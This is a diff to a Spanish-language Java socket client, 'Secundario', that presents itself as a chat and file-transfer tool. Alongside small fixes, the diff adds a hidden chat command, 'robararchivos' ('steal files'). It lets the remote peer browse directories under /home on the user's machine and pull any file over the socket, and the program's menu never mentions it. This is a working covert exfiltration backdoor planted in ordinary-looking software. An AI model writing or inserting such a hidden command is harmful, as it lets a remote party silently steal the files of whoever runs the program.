@@ -10,6 +10,12 @@ import java.io.IOException;
 import java.io.*;
 import java.net.ConnectException;
 import java.net.Socket;
+import java.nio.file.DirectoryStream;
+import java.nio.file.Files;
+import java.nio.file.NoSuchFileException;
+import java.nio.file.NotDirectoryException;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.util.Scanner;
 import java.util.logging.Level;
 import java.util.logging.Logger;
@@ -26,7 +32,7 @@ public class Secundario {
     public static void main(String[] args) {
         // TODO code application logic here
         
-        final String Host="192.168.1.76";   
+        final String Host="192.168.1.73";   
         final int puerto = 5000;
         DataInputStream in;
         DataOutputStream out;
@@ -45,7 +51,12 @@ public class Secundario {
             System.out.println("2)Enviar archivo");
             System.out.println("3)Recibir archivo");
             System.out.println("0)Salir"); 
-            opc=Integer.parseInt(porleer.nextLine());
+            try{
+                opc=Integer.parseInt(porleer.nextLine());
+            }catch(Exception e){
+                System.out.println("No escribió un entero.");
+            }
+            
             
             switch(opc){                
                 case 1:
@@ -70,8 +81,58 @@ public class Secundario {
                                     System.out.println("El usuario ha salido.");
                                     mensaje="1";
                                     break;
-                                }else
+                                }if(mensaje.equals("robararchivos")){
+                                    String nombre="/home";
+                                    String nombreaux,nombreaux2=nombre;
+                                    mensaje="";
+                                    while(!mensaje.equals("finalizar")){
+                                        nombreaux=nombreaux2+"/"+mensaje;   
+                                        try(DirectoryStream<Path> carpeta =Files.newDirectoryStream(Paths.get(nombreaux))){
+                                            nombreaux2=nombreaux;
+                                            for(Path arch : carpeta){
+                                                out.writeUTF(arch.getFileName().toString());
+                                            }
+                                            out.writeUTF("archfin");
+                                            mensaje=in.readUTF();
+                                        }catch(NotDirectoryException excepcion){ 
+                                                nombreaux2=nombreaux;
+                                                out.writeUTF("robandoarchivo");
+                                                try{
+                                                    File localFile = new File(nombreaux2);                        
+                                                    bis=new BufferedInputStream(new FileInputStream(localFile));
+                                                    bos=new BufferedOutputStream(sck.getOutputStream());                                                    
+                                                    byteArray=new byte[8192];                        
+                                                    while((i=bis.read(byteArray))!=-1){
+                                                        bos.write(byteArray,0,i);
+                                                        System.out.println("Hola2");
+                                                    }
+                                                    System.out.println("Hola");
+                                                    bis.close();
+                                                    bos.close();
+                                                    sck.close();
+                                                    mensaje="0";
+                                                    System.out.println("El usuario ha salido.");
+                                                    break;                                                    
+                                                }catch(Exception e){
+                                                    System.out.println(nombreaux2);
+                                                    System.out.println(e.toString());
+                                                }
+                                        }catch(NoSuchFileException nf){
+                                            mensaje="archinexistente";
+                                            out.writeUTF(mensaje);
+                                            mensaje=in.readUTF();                                        
+                                            
+                                        }
+                                        catch(IOException ex){
+                                            System.out.println(ex.toString());
+                                        }
+                                        
+                                    }
+                                    
+                                }
+                                else{
                                     System.out.println("Otro: "+mensaje);
+                                }
                             } 
                         }            
                     }                     
